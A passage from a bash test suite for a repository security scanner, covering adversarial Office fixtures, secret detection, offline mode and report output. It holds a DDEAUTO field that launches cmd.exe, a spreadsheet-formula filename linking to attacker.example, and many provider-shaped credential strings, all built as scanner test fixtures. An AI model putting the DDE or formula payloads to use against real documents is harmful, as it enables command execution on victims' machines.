        "OFFICE_MAX_ENTRIES: parts beyond the limit are reported as not read"
    assert_contains "$(office_with OFFICE_READ_BUDGET_MB=1)" "read budget" \
        "OFFICE_READ_BUDGET_MB: an exhausted read budget is reported"
    assert_contains "$(office_with OFFICE_READ_BUDGET_MB=1)" "read only in part" \
        "…and a streamed XML part larger than the budget is cut at the budget and says so"
    assert_contains "$(office_with OFFICE_TIME_BUDGET_S=0.001)" "time budget exceeded" \
        "OFFICE_TIME_BUDGET_S: an exceeded time budget is reported"

    OFFPY="${SCRATCH}/office_facts.py"
    cp "${ROOT_DIR}/transit/containers/office.py" "$OFFPY"
    OFFGONE=$(python3 -I "$OFFPY" "${SCRATCH}/no_such.docx" "${SCRATCH}/view.txt" docx 2>&1 || true)
    assert_contains "$OFFGONE" "FACT unreadable_file" \
        "a file that cannot be opened is reported as unreadable"
    assert_contains "$OFFGONE" "FACT done" \
        "…and the helper still finishes, so the scanner can tell it from a crash"

    # Pathological inputs, each a few KB to a few MB and each quadratic under an unbounded pattern.
    python3 -I - "$SCRATCH" "${FIXTURES}" <<'ADVEOF'
import sys
sys.path.insert(0, sys.argv[2])
import make_office_fixtures as m
d = sys.argv[1]
def vba_doc(src):
    return m.docx(extra={"word/vbaProject.bin": m.cfb(m.vba_project({"ThisDocument": src}))},
                  content_extra='<Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>')


HEAD = 'Attribute VB_Name = "ThisDocument"\n'
cases = {
    # VBA source: the auto-run finder and the declaration search ran in time quadratic in blank lines / repeats
    "adv_vba_blank.docm": vba_doc(HEAD + "\n" * 100000 + "x = 1\n"),
    "adv_vba_blank_spaces.docm": vba_doc(HEAD + "   \n" * 60000 + "x = 1\n"),
    "adv_vba_lib.docm": vba_doc(HEAD + "Declare Function f " + 'Lib "kernel32" ' * 300000 + "\n"),
    "adv_vba_continued.docm": vba_doc(HEAD + "x = 1 _\n" * 300000 + "y = 2\n"),
    "adv_vba_powershell.docm": vba_doc(HEAD + "powershell -e " * 300000 + "\n"),
    # a compound file with 20000 storages in its ObjectPool: each used to scan every path
    "adv_objpool.doc": m.cfb({"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60, "ObjectPool": {f"_{i}": {"x": b"1"} for i in range(20000)}}),
    # comments, CDATA and processing instructions that never close, or open and close a million times
    "adv_comments.docx": m.docx(doc_xml=m.CT_HEAD + f"<w:document {m.NS_W}><w:body>" + "<!--" * 1000000 + "</w:body></w:document>"),
    "adv_cdata_open.docx": m.docx(doc_xml=m.CT_HEAD + f"<w:document {m.NS_W}><w:body>" + "<![CDATA[" * 400000 + "</w:body></w:document>"),
    "adv_pi.docx": m.docx(doc_xml=m.CT_HEAD + f"<w:document {m.NS_W}><w:body>" + "<?" * 1500000 + "</w:body></w:document>"),
    "adv_mixed_openers.docx": m.docx(doc_xml=m.CT_HEAD + f"<w:document {m.NS_W}><w:body>" + "<!--x--><![CDATA[y]]><?z?>" * 150000 + "<?" + "</w:body></w:document>"),
    # entity declarations with long whitespace runs, and 300000 of them
    "adv_entity_spaces.docx": m.docx(doc_xml=m.CT_HEAD + "<!DOCTYPE d [" + ("<!ENTITY a" + " " * 3000) * 1000 + f"]><w:document {m.NS_W}/>"),
    "adv_entity_pairs.docx": m.docx(doc_xml=m.CT_HEAD + "<!DOCTYPE d [" + "<!ENTITY x y " * 300000 + f"]><w:document {m.NS_W}/>"),
    # a Flat OPC package of 200000 part openers, and one of 50000 binary parts
    # 200 nested \object groups around one large objdata, each of which used to be re-read; and a compound file whose
    # storages nest 200 deep (paths are tuples, so depth costs quadratic memory)
    "adv_rtf_nested.rtf": m.rtf("{\\object" * 200 + "{\\*\\objdata " + "00" * 1000000 + "}" + "}" * 200),
    "adv_cfb_deep.doc": m.cfb({"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60, "ObjectPool": __import__("functools").reduce(lambda acc, i: {"s%d" % i: acc}, range(200), {"x": b"1"})}),
    "adv_rels_many.docx": m.docx(extra={"word/_rels/r%d.xml.rels" % i: b"<Relationships>" + b'<Relationship Id="r" Type="x/image" Target="a/b.png"/>' * 5000 + b"</Relationships>" for i in range(40)}),
    "adv_flat_opc.docx": ('<?xml version="1.0"?><pkg:package xmlns:pkg="http://schemas.microsoft.com/office/2006/xmlPackage">' + '<pkg:part pkg:name="/a" pkg:contentType="x">' * 200000 + "</pkg:package>").encode(),
    "adv_flat_parts.docx": ('<?xml version="1.0"?><pkg:package xmlns:pkg="http://schemas.microsoft.com/office/2006/xmlPackage">' + '<pkg:part pkg:name="/a" pkg:contentType="x"><pkg:binaryData>QUJD</pkg:binaryData></pkg:part>' * 50000 + "</pkg:package>").encode(),
    "adv_instr.docx": m.docx(doc_xml=m.CT_HEAD + f"<w:document {m.NS_W}><w:body>" + "<w:instrText>" * 300000 + "</w:body></w:document>"),
    "adv_angle.odt": m.odf("<a" * 1500000),
    "adv_template.rtf": m.rtf("{\\*\\template " * 300000),
    "adv_objects.rtf": m.rtf("{\\object{\\*\\objdata " * 200000),
    "adv_rels.docx": m.docx(extra={"word/_rels/document.xml.rels": b"<Relationships>" + b"<Relationship " * 300000 + b"</Relationships>"}),
    "adv_entity.docx": m.docx(doc_xml=m.CT_HEAD + "<!DOCTYPE d [" + "<!ENTITY a " * 200000 + f"]><w:document {m.NS_W}/>"),
    "adv_basic_tags.odt": m.odf(extra={"Basic/Standard/M.xml": (m.CT_HEAD + '<script:module xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" script:name="M">' + "<a" * 1500000 + "</script:module>").encode()}),
    "adv_flat_modules.fodt": (m.CT_HEAD + f'<office:document {m.ODF_NS} office:mimetype="application/vnd.oasis.opendocument.text">' + "<script:module " * 300000 + "</office:document>").encode(),
}
for n, data in cases.items():
    open(f"{d}/{n}", "wb").write(data)
ADVEOF
    # A field whose instruction is split between two 4 MB slices: " DD" in the first, "EAUTO ..." in the
    # second. Only a reader that carries the open field from one slice to the next joins them.
    python3 -I - "$SCRATCH" "${FIXTURES}" <<'ADVEOF'
import sys
sys.path.insert(0, sys.argv[2])
import make_office_fixtures as m
pad = "<w:p><w:r><w:t>" + "x" * 900 + "</w:t></w:r></w:p>"
body = ('<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> DD</w:instrText></w:r></w:p>' + pad * 6000
        + '<w:p><w:r><w:instrText>EAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"</w:instrText></w:r>'
          '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
open(sys.argv[1] + "/adv_straddle.docx", "wb").write(m.docx(body))
ADVEOF
    OFFSTR=$(python3 -I "$OFFPY" "${SCRATCH}/adv_straddle.docx" "${SCRATCH}/view.txt" docx 2>&1 || true)
    assert_contains "$OFFSTR" "FACT dde" \
        "a DDEAUTO instruction split between two 4 MB slices is joined and found"

    # Every byte read from a compound file is charged to the read budget, and an exhausted budget is reported.
    OFFCFB=$(OFFICE_READ_BUDGET_MB=0.0001 python3 -I "$OFFPY" "${FIXTURES}/rules/office_legacy_macro.doc" "${SCRATCH}/view.txt" doc 2>&1 || true)
    assert_contains "$OFFCFB" "read budget" \
        "OFFICE_READ_BUDGET_MB also limits what is read from a compound file"

    # The alarm: a helper stuck in a loop no budget check can reach is stopped, and what it found is kept.
    sed 's/^def run():$/def run():\n    emit("marker", "found before the hang")\n    while True:\n        pass/' "$OFFPY" > "${SCRATCH}/office_facts_stuck.py"
    OFFSTUCK=$(OFFICE_TIME_BUDGET_S=1 timeout 60 python3 -I "${SCRATCH}/office_facts_stuck.py" "${FIXTURES}/rules/office_safe.docx" "${SCRATCH}/view.txt" docx 2>&1 || true)
    assert_contains "$OFFSTUCK" "FACT incomplete" \
        "a helper stuck past its time budget is stopped by the alarm and reports the document as not fully read"
    assert_contains "$OFFSTUCK" "FACT marker" \
        "…and keeps what it found before it was stopped"
    assert_contains "$OFFSTUCK" "FACT done" \
        "…and still finishes, so the scanner can tell it from a crash"
    for _adv in adv_instr.docx adv_angle.odt adv_template.rtf adv_objects.rtf adv_rels.docx adv_entity.docx adv_basic_tags.odt adv_flat_modules.fodt \
                adv_vba_blank.docm adv_vba_blank_spaces.docm adv_vba_lib.docm adv_vba_continued.docm adv_vba_powershell.docm adv_objpool.doc \
                adv_comments.docx adv_cdata_open.docx adv_pi.docx adv_mixed_openers.docx adv_entity_spaces.docx adv_entity_pairs.docx \
                adv_flat_opc.docx adv_flat_parts.docx adv_rtf_nested.rtf adv_cfb_deep.doc adv_rels_many.docx; do
        OFFSLOW=$(timeout 20 python3 -I "$OFFPY" "${SCRATCH}/${_adv}" "${SCRATCH}/view.txt" "${_adv##*.}" 2>&1 || true)
        assert_contains "$OFFSLOW" "FACT done" \
            "adversarial input finishes inside 20 s (no quadratic pattern): ${_adv}"
        if [[ "$_adv" == adv_cfb_deep.doc ]]; then
            assert_contains "$OFFSLOW" "FACT incomplete" \
                "storages nested 200 deep are read only to a depth of 64, and the file says so"
        fi
        if [[ "$_adv" == adv_rtf_nested.rtf ]]; then
            assert_contains "$OFFSLOW" "FACT incomplete" \
                "200 nested object groups around one objdata are read to a bound, and the file says so"
        fi
        if [[ "$_adv" == adv_objpool.doc ]]; then
            assert_contains "$OFFSLOW" "FACT incomplete" \
                "a compound file with 20000 embedded objects is read only in part, and says so"
        fi
    done
    # Relationship parts are charged to the read budget like every other part (forty of them, a megabyte budget).
    OFFRELS=$(OFFICE_READ_BUDGET_MB=1 python3 -I "$OFFPY" "${SCRATCH}/adv_rels_many.docx" "${SCRATCH}/view.txt" docx 2>&1 || true)
    assert_contains "$OFFRELS" "read budget" \
        "relationship parts count against the read budget, and an exhausted budget is reported"
fi

group "Layer B — end-to-end verdicts"
if ! _skipping; then
    run_pipeline "${FIXTURES}/clean" --quiet
    assert_eq "0" "$RUN_EXIT" "clean repo exits 0"
    [[ -n "$RUN_JSON" ]] && assert_eq "PASS" "$(json_get "$RUN_JSON" verdict)" \
        "clean repo verdict is PASS"

    run_pipeline "${FIXTURES}/vulnerable" --quiet
    assert_eq "1" "$RUN_EXIT" "vulnerable repo exits 1"
    [[ -n "$RUN_JSON" ]] && assert_eq "FAIL" "$(json_get "$RUN_JSON" verdict)" \
        "vulnerable repo verdict is FAIL"
fi

# A monorepo with dozens of requirements files. Layer 3 listed them with
# `find … | head -5`; under `set -o pipefail`, head exiting early kills find
# with SIGPIPE once its output no longer fits one 4 KB write, the pipeline
# returns 141, and `set -e` aborted the whole scan — no verdict, no report.
# Eight short paths never trigger it, which is how it went unnoticed; it needs
# a few dozen realistic ones. ai_transit.sh defaults a missing verdict to FAIL,
# so the failure was safe but wrong: the repository was quarantined for having
# too many requirements files.
MONO="${SCRATCH}/monorepo"
for i in $(seq 1 40); do
    mkdir -p "${MONO}/service-number-${i}/backend/application/config"
    echo "requests==2.31.0" > "${MONO}/service-number-${i}/backend/application/config/requirements.txt"
done
run_pipeline "$MONO" --quiet
assert_eq "0" "$RUN_EXIT" "a monorepo with 40 requirements files completes and passes"
if [[ -n "$RUN_JSON" ]]; then
    ok_test "a monorepo with 40 requirements files writes a report"
else
    fail_test "a monorepo with 40 requirements files writes a report" \
              "scan died without a report (exit ${RUN_EXIT}; 141 is SIGPIPE under pipefail)"
fi
MONOLOCK="${SCRATCH}/monorepo_locks"
for i in $(seq 1 45); do
    mkdir -p "${MONOLOCK}/package-number-${i}/frontend/application/workspace"
    echo '{"lockfileVersion":3}' > "${MONOLOCK}/package-number-${i}/frontend/application/workspace/package-lock.json"
done
run_pipeline "$MONOLOCK" --quiet
if [[ -n "$RUN_JSON" ]]; then
    ok_test "a monorepo with 45 lockfiles writes a report"
else
    fail_test "a monorepo with 45 lockfiles writes a report" \
              "scan died without a report (exit ${RUN_EXIT}; 141 is SIGPIPE under pipefail)"
fi

# ═════════════════════════════════════════════════════════════════════════════
# Known credential formats, built at run time
# ═════════════════════════════════════════════════════════════════════════════
# Each token below is assembled from a context, a prefix and two halves of a
# body that sit in separate quoted strings, so this file never holds a
# contiguous token. Two reasons: this pipeline run over its own repository
# would otherwise flag its own test suite, and a secret scanner on the remote
# may refuse a push that contains provider-shaped strings.
SECR="${SCRATCH}/known_secrets"
mkdir -p "$SECR"
put_secret() { printf '%s\n' "$2" > "${SECR}/known_$1.txt"; }
put_secret aws_access_key_id "aws_access_key_id = ""AKIA""WSLDPOPA""8IDMMTGM"
put_secret aws_secret_access_key "aws_secret_access_key = ""toB5aoVsS8hhss6inCQm""w31l26fqXAhjVmMyamjX"
put_secret github_token "export GITHUB_TOKEN=""ghp_""oKFEOeVI2WdxcX4L8y""aUEcp4bWTkt2HGVHQx"
put_secret github_fine_grained_pat "token: ""github_pat_""Uc2tDa29hb5sLLd6cUGXayGrBbDUvQ""mSuP4MJ5SQGUH7FrVQ2quG8z1YJ0Kw"
put_secret gitlab_pat "GITLAB_TOKEN=""glpat-""Twtt7L5tbe""6IDp_3st9F"
put_secret stripe_live_key "STRIPE_KEY=""sk_live_""KUbMBGKxflzvZd""u34gMRmaUrUwyM"
put_secret slack_token "SLACK_BOT_TOKEN=""xoxb-""871990237361-137326652659""-tZddgPODHoEidsYlVEEBxzud"
put_secret google_api_key "key = ""AIza""CrCX6iZlxlj7fDNuR""GwJSfhIENqKTTiqt2x"
put_secret google_oauth_token "access = ""ya29.""N5OXzzezpSWT9SqRzG9l""Up--cLLpQJa3WIeMosrs"
put_secret sendgrid_key "SENDGRID=""SG.""mhSJnHLwAXcUnTf6MvPTVg.QU9gnSsHUU""FRleDJAlNhCYlhQupaD70ahgOQ0TvJDK5"
put_secret npm_token "//registry.npmjs.org/:_authToken=""npm_""NMNGQAItkyWqEc3VQh""aX31ke6Uu53X2ohd5c"
put_secret pypi_token "password = ""pypi-AgEIcHlwaS5vcmc""8dNKdzVHlw6s5wWOroxjtBhYeNvuvg""lFU9leuBZHYyEBrxKbg2Ir6zOKRuhl"
put_secret huggingface_token "HF_TOKEN=""hf_""HyqmHLPFDUi4OOEit""j59FfZTWuE7xVAuwQ"
put_secret anthropic_key "ANTHROPIC_API_KEY=""sk-ant-api03-""DRlCCy2XaflpZPEIkEosNeLJvFZJX_ucvqIDITZFgE0_F""bvIY3nXCZY72Co5fzjVj-zG5eISJVAG7_rr0xKBvwNsmJ"
put_secret openai_project_key "OPENAI_API_KEY=""sk-proj-""8VpoAuXnm-sMkbiTANEBhAxQ""FknjLLlzjkXnHlNfyeG6hf9q"
put_secret openai_legacy_key "OPENAI_API_KEY=""sk-""WXrSZrLEeoS7bCDUC64yhrYq""zb3joq4YDtfomwplf3LZ3cws"
put_secret shopify_token "SHOPIFY=""shpat_""cd7701ff77976566""445ff51d43c0a76f"
put_secret digitalocean_token "DO_TOKEN=""dop_v1_""81e402f19126284c122a510e2ed5e81d""a5487e8579f405b60532147c46e01bfa"
put_secret jwt "session = ""eyJlCIxr89LcspvfiHbtwjH_j3Db0BtCH9sY"".""eyJFsvZc6Xjc3Gy4Orwd""naWW-iTRnXvaZtm9eaygGWI"".""3r90T2kmsR95izWTG1E3s9nE_5jG_f34X5FPbxph9y5"
# Near-misses: every line here is something a naive pattern flags.
{
    echo "aws_access_key_id = ""AKIAIOSFODNN7""EXAMPLE"      # AWS's own documentation key
    echo "token = ""ghp_""$(printf 'x%.0s' $(seq 1 36))"    # placeholder body
    echo "token = ""ghp_""$(printf 'A%.0s' $(seq 1 36))"    # one repeated character
    echo "token = ""ghp_16C7e42F""292c6912E7710c838347Ae178B4a"  # GitHub's documentation example
    echo "STRIPE_KEY=""sk_test_""PP7tbgUZLQPJww5wQMMyBQQn5zpG"           # test mode, harmless
    echo "x = hf_config_value_that_is_long_enough_to_look_real"   # underscores end the token
    echo "commit 3a7bd3e2360a3d29eea436fcfb7e44c735d117c4"        # a git sha
    echo "id = zzAKIA""Z961ELEFI1I64MFQ""zz"             # token embedded mid-identifier
} > "${SECR}/known_safe.txt"
# The same token inside a jar: once as a text resource, once as a string constant
# in a class file's constant pool, where it sits between binary length fields.
AITRANSIT_TEST_TOKEN="ghp_""oKFEOeVI2WdxcX4L8y""aUEcp4bWTkt2HGVHQx" \
    python3 "${FIXTURES}/make_jar_fixtures.py" --credential-jars "$SECR"
AITRANSIT_TEST_TOKEN="ghp_""oKFEOeVI2WdxcX4L8y""aUEcp4bWTkt2HGVHQx" \
    python3 "${FIXTURES}/make_office_fixtures.py" --credential-docs "$SECR"
run_pipeline "$SECR" --quiet
FK=""
[[ -n "$RUN_JSON" ]] && FK=$(json_findings "$RUN_JSON")
kline() { echo "$FK" | grep "/$1 " || true; }

assert_contains "$(kline known_aws_access_key_id.txt)" "CWE-798:known_credential_format_aws_access_key_id" \
    "an AWS access key id is flagged"
assert_contains "$(kline known_aws_secret_access_key.txt)" "CWE-798:known_credential_format_aws_secret_access_key" \
    "an AWS secret access key is flagged"
assert_contains "$(kline known_github_token.txt)" "CWE-798:known_credential_format_github_token" \
    "a GitHub personal access token is flagged"
assert_contains "$(kline known_github_fine_grained_pat.txt)" "CWE-798:known_credential_format_github_fine_grained_pat" \
    "a GitHub fine-grained token is flagged"
assert_contains "$(kline known_gitlab_pat.txt)" "CWE-798:known_credential_format_gitlab_pat" \
    "a GitLab access token is flagged"
assert_contains "$(kline known_stripe_live_key.txt)" "CWE-798:known_credential_format_stripe_live_key" \
    "a Stripe live secret key is flagged"
assert_contains "$(kline known_slack_token.txt)" "CWE-798:known_credential_format_slack_token" \
    "a Slack token is flagged"
assert_contains "$(kline known_google_api_key.txt)" "CWE-798:known_credential_format_google_api_key" \
    "a Google API key is flagged"
assert_contains "$(kline known_google_oauth_token.txt)" "CWE-798:known_credential_format_google_oauth_token" \
    "a Google OAuth token is flagged"
assert_contains "$(kline known_sendgrid_key.txt)" "CWE-798:known_credential_format_sendgrid_key" \
    "a SendGrid key is flagged"
assert_contains "$(kline known_npm_token.txt)" "CWE-798:known_credential_format_npm_token" \
    "an npm token is flagged"
assert_contains "$(kline known_pypi_token.txt)" "CWE-798:known_credential_format_pypi_token" \
    "a PyPI token is flagged"
assert_contains "$(kline known_huggingface_token.txt)" "CWE-798:known_credential_format_huggingface_token" \
    "a Hugging Face token is flagged"
assert_contains "$(kline known_anthropic_key.txt)" "CWE-798:known_credential_format_anthropic_key" \
    "an Anthropic API key is flagged"
assert_contains "$(kline known_openai_project_key.txt)" "CWE-798:known_credential_format_openai_project_key" \
    "an OpenAI project key is flagged"
assert_contains "$(kline known_openai_legacy_key.txt)" "CWE-798:known_credential_format_openai_legacy_key" \
    "a legacy OpenAI key is flagged"
assert_contains "$(kline known_shopify_token.txt)" "CWE-798:known_credential_format_shopify_token" \
    "a Shopify token is flagged"
assert_contains "$(kline known_digitalocean_token.txt)" "CWE-798:known_credential_format_digitalocean_token" \
    "a DigitalOcean token is flagged"
assert_contains "$(kline jar_cred_text.jar)" "CWE-798:known_credential_format_github_token" \
    "a GitHub token in a jar's text resource is flagged"
assert_contains "$(kline jar_cred_class.jar)" "CWE-798:known_credential_format_github_token" \
    "a GitHub token in a class file's constant pool is flagged"
assert_contains "$(kline jar_cred_utf16.jar)" "CWE-798:known_credential_format_github_token" \
    "a GitHub token in a UTF-16 resource is flagged"
assert_contains "$(kline office_cred.docx)" "CWE-798:known_credential_format_github_token" \
    "a GitHub token pasted into a Word document is flagged"
assert_contains "$(kline office_cred.xlsx)" "CWE-798:known_credential_format_github_token" \
    "a GitHub token in an Excel cell is flagged"
assert_contains "$(kline known_jwt.txt)" "jwt_embedded" \
    "a JWT is reported, but does not block"
assert_not_contains "$(kline known_jwt.txt)" "[FAIL]" \
    "a JWT alone does NOT fail the file"
assert_not_contains "$(kline known_safe.txt)" "[FAIL]" \
    "does NOT flag documentation keys, placeholders, test keys or mid-identifier matches"


# ═════════════════════════════════════════════════════════════════════════════
# LAYER C — Flags and features
# ═════════════════════════════════════════════════════════════════════════════
group "Layer C — flags and features"
if ! _skipping; then
    # --report-only: never blocks, and must not quarantine.
    run_pipeline "${FIXTURES}/vulnerable" --report-only
    assert_eq "0" "$RUN_EXIT" "--report-only exits 0 despite FAIL verdict"
    QN=$(ls -A "${RUN_WORK}/quarantine" 2>/dev/null | wc -l)
    assert_eq "0" "$QN" "--report-only leaves quarantine empty"
    FN=$(ls -d "${RUN_WORK}"/fetch/repo_* 2>/dev/null | wc -l)
    assert_eq "1" "$FN" "--report-only preserves the fetched directory"

    # Default (no --report-only) must quarantine.
    run_pipeline "${FIXTURES}/vulnerable" --quiet
    QN=$(ls -A "${RUN_WORK}/quarantine" 2>/dev/null | wc -l)
    if (( QN > 0 )); then ok_test "default run quarantines on FAIL"
    else fail_test "default run quarantines on FAIL" "quarantine empty"; fi

    # --min-severity critical: a HIGH finding should no longer block.
    run_pipeline "${FIXTURES}/vulnerable" --quiet --min-severity critical
    assert_eq "0" "$RUN_EXIT" "--min-severity critical downgrades HIGH to WARN"

    # Missing argument must be a clean error, not a crash.
    OUT=$(cd "$ROOT_DIR" && ./ai_transit.sh --min-severity 2>&1); EC=$?
    assert_eq "1" "$EC" "--min-severity with no argument exits 1"
    assert_contains "$OUT" "requires an argument" \
        "--min-severity with no argument explains itself"

    # .transit-allow.json downgrades a matching FAIL to WARN.
    run_pipeline "${FIXTURES}/allowlisted" --quiet
    assert_eq "0" "$RUN_EXIT" "allowlisted finding does not block"

    # .transitignore excludes matched files from scanning.
    run_pipeline "${FIXTURES}/ignored" --quiet
    assert_eq "0" "$RUN_EXIT" ".transitignore excludes the offending file"

    # --no-zip / --no-excel: reports still written, no archive produced.
    run_pipeline "${FIXTURES}/clean" --quiet --no-zip --no-excel
    assert_eq "0" "$RUN_EXIT" "--no-zip --no-excel still exits 0 on PASS"
    ZN=$(ls "${RUN_WORK}/out"/*.zip 2>/dev/null | wc -l)
    assert_eq "0" "$ZN" "--no-zip produces no archive"
    assert_file_exists "$RUN_JSON" "--no-zip still writes the JSON report"
fi

# ═════════════════════════════════════════════════════════════════════════════
# LAYER C2 — Offline / air-gapped operation
# Stubs stand in for semgrep and trivy so the flags passed to them can be
# asserted without installing either. What matters is that offline the pipeline
# never reaches for the network AND never stays silent about a layer it could
# not run: a quiet skip would present an empty result as a clean one.
# ═════════════════════════════════════════════════════════════════════════════
group "Layer C2 — offline mode"
if ! _skipping; then
    STUBS="${SCRATCH}/stubs"
    mkdir -p "$STUBS"
    for tool in semgrep trivy; do
        cat > "${STUBS}/${tool}" <<EOF
#!/bin/sh
echo "\$@" >> "${STUBS}/${tool}_calls.txt"
echo '{"results":[],"Results":[]}'
EOF
        chmod +x "${STUBS}/${tool}"
    done

    # Offline with nothing staged: both layers must be reported as not run.
    rm -f "${STUBS}"/*_calls.txt
    RUN_WORK="${SCRATCH}/off_bare"; mkdir -p "$RUN_WORK"
    # Layer 3 (dependency CVEs) is switched off by default; these checks are about it.
    OUT=$(cd "$ROOT_DIR" && PATH="${STUBS}:$PATH" WORK_DIR="$RUN_WORK" RUN_SCA=true \
          OUTPUT_DIR="${RUN_WORK}/out" timeout 300 ./ai_transit.sh --offline \
          "${FIXTURES}/clean" 2>&1)

    assert_contains "$OUT" "OFFLINE:Layer 2 skipped entirely" \
        "offline without staged rules reports Layer 2 as not run"
    assert_contains "$OUT" "OFFLINE:trivy database not staged" \
        "offline without a staged DB reports the CVE scan as not run"
    assert_contains "$OUT" "OFFLINE:Python dependency CVE scan unavailable" \
        "offline names pip-audit/safety as unavailable rather than skipping quietly"

    if [[ -f "${STUBS}/semgrep_calls.txt" ]]; then
        fail_test "offline never invokes semgrep without staged rules" \
                  "semgrep was called"
    else
        ok_test "offline never invokes semgrep without staged rules"
    fi
    if [[ -f "${STUBS}/trivy_calls.txt" ]]; then
        fail_test "offline never invokes trivy without a staged database" \
                  "trivy was called"
    else
        ok_test "offline never invokes trivy without a staged database"
    fi

    # Offline with staged assets: local paths and update-suppressing flags.
    rm -f "${STUBS}"/*_calls.txt
    CACHE="${SCRATCH}/cache"
    mkdir -p "${CACHE}/semgrep-rules" "${CACHE}/trivy-db/db"
    for r in owasp-top-ten cwe-top-25 security-audit secrets; do
        echo "rules: []" > "${CACHE}/semgrep-rules/${r}.yaml"
    done
    touch "${CACHE}/trivy-db/db/trivy.db"
    RUN_WORK="${SCRATCH}/off_staged"; mkdir -p "$RUN_WORK"
    (cd "$ROOT_DIR" && PATH="${STUBS}:$PATH" WORK_DIR="$RUN_WORK" RUN_SCA=true \
     OUTPUT_DIR="${RUN_WORK}/out" OFFLINE_CACHE="$CACHE" \
     timeout 300 ./ai_transit.sh --offline "${FIXTURES}/clean" >/dev/null 2>&1) || true

    SG=$(cat "${STUBS}/semgrep_calls.txt" 2>/dev/null || true)
    assert_contains "$SG" "${CACHE}/semgrep-rules/owasp-top-ten.yaml" \
        "offline points semgrep at the staged ruleset file"
    assert_not_contains "$SG" "--config=p/" \
        "offline never resolves a semgrep registry identifier"
    assert_contains "$SG" "--metrics=off" \
        "offline disables semgrep telemetry"

    TV=$(cat "${STUBS}/trivy_calls.txt" 2>/dev/null || true)
    assert_contains "$TV" "--skip-db-update" "offline stops trivy updating its database"
    assert_contains "$TV" "--offline-scan"   "offline puts trivy in offline-scan mode"
    assert_contains "$TV" "$CACHE"           "offline points trivy at the staged cache"

    # A remote URL cannot be honoured without a network; refuse, do not hang.
    RUN_WORK="${SCRATCH}/off_remote"; mkdir -p "$RUN_WORK"
    OUT=$(cd "$ROOT_DIR" && WORK_DIR="$RUN_WORK" timeout 60 ./ai_transit.sh \
          --offline https://github.com/org/repo 2>&1); EC=$?
    assert_eq "1" "$EC" "offline refuses a remote URL"
    assert_contains "$OUT" "without a network" \
        "offline explains why a remote URL cannot be used"

    # The report must state, per layer, whether it ran. A verdict alone cannot
    # distinguish "clean" from "nothing was examined"; this is what the
    # air-gapped acceptance gate keys on (OFFLINE_RUNBOOK.md phase 5).
    run_pipeline "${FIXTURES}/clean" --offline --quiet
    if [[ -n "$RUN_JSON" ]]; then
        assert_contains "$(cat "$RUN_JSON")" '"coverage"' \
            "report includes a per-layer coverage block"
        assert_contains "$(cat "$RUN_JSON")" '"coverage_complete"' \
            "report states whether coverage was complete"

        # With no scanners installed, the layers that need them must be
        # reported as gaps -- not silently omitted.
        GAPS=$(python3 -c "
import json,sys
d=json.load(open('$RUN_JSON'))
print(' '.join(sorted(d.get('coverage_gaps',[]))))
" 2>/dev/null || true)
        assert_contains "$GAPS" "L2_owasp_cwe" \
            "a layer whose tool is absent is recorded as a coverage gap"

        # Layers built into the pipeline always run and must say so.
        L4=$(python3 -c "
import json
print(json.load(open('$RUN_JSON')).get('coverage',{}).get('L4_patterns',''))
" 2>/dev/null || true)
        assert_eq "ran" "$L4" "built-in pattern layer reports that it ran"
    fi
fi

# ═════════════════════════════════════════════════════════════════════════════
# LAYER D — Output artifacts
# ═════════════════════════════════════════════════════════════════════════════
group "Layer D — output artifacts"
if ! _skipping; then
    run_pipeline "${FIXTURES}/clean" --quiet

    assert_file_exists "$RUN_JSON" "JSON report is written"
    if [[ -n "$RUN_JSON" ]]; then
        if python3 -c "import json;json.load(open('$RUN_JSON'))" 2>/dev/null; then
            ok_test "JSON report is valid JSON"
        else
            fail_test "JSON report is valid JSON" "json.load failed"
        fi
        assert_contains "$(cat "$RUN_JSON")" '"verdict"' "JSON report has a verdict field"
    fi
    assert_file_exists "${RUN_JSON%.json}.html" "HTML report is written"

    # ZIP entries must be repo-relative: an archive carrying the internal
    # WORK_DIR layout leaks server paths to whoever receives it.
    ZIP=$(ls -t "${RUN_WORK}/out"/*.zip 2>/dev/null | head -1 || true)
    if [[ -z "$ZIP" ]]; then
        fail_test "PASS run produces a ZIP archive" "no zip in output dir"
    else
        ok_test "PASS run produces a ZIP archive"
        if command -v unzip &>/dev/null; then
            ENTRIES=$(unzip -Z1 "$ZIP" 2>/dev/null)
            # zip stores paths with the leading "/" stripped, so comparing
            # against the absolute $RUN_WORK would never match. Look for the
            # internal layout marker instead.
            assert_not_contains "$ENTRIES" "fetch/repo_" \
                "ZIP entries do not embed the internal work directory"
            # Must match a whole entry, not a substring: the bad form
            # "tmp/work/fetch/repo_x/src/app.py" also contains "src/app.py".
            if echo "$ENTRIES" | grep -qx 'src/app\.py'; then
                ok_test "ZIP entries are rooted at the repository"
            else
                fail_test "ZIP entries are rooted at the repository" \
                    "no entry equal to 'src/app.py'"
                $VERBOSE && echo -e "    ${DIM}${ENTRIES}${RESET}"
            fi
        else
            skip_test "ZIP entry paths" "unzip not installed"
        fi
    fi

    # Excel report: only assert when openpyxl is available.
    if python3 -c "import openpyxl" 2>/dev/null; then
        XLSX="${SCRATCH}/report.xlsx"
        if python3 "${ROOT_DIR}/generate_excel_report.py" "$RUN_JSON" "$XLSX" >/dev/null 2>&1; then
            SHEETS=$(python3 -c "
from openpyxl import load_workbook
print(','.join(load_workbook('$XLSX').sheetnames))")
            assert_contains "$SHEETS" "Findings" "Excel report has a Findings tab"
        else
            fail_test "Excel report generates" "generate_excel_report.py failed"
        fi
        # A repository file named like a formula must be a string in the report, not a live formula.
        INJ="${SCRATCH}/xlsx_inject"
        rm -rf "$INJ"; mkdir -p "$INJ"
        printf 'AKIA%s\n' "ABCDEFGHIJKLMNOP" > "$INJ/=HYPERLINK(\"http:--attacker.example\",\"click\").txt"
        printf 'x\n' > "$INJ/@SUM(1+1).txt"
        run_pipeline "$INJ" --quiet
        if [[ -n "$RUN_JSON" ]] && python3 "${ROOT_DIR}/generate_excel_report.py" "$RUN_JSON" "${SCRATCH}/inject.xlsx" >/dev/null 2>&1; then
            XLF=$(python3 -c "
from openpyxl import load_workbook
wb = load_workbook('${SCRATCH}/inject.xlsx')
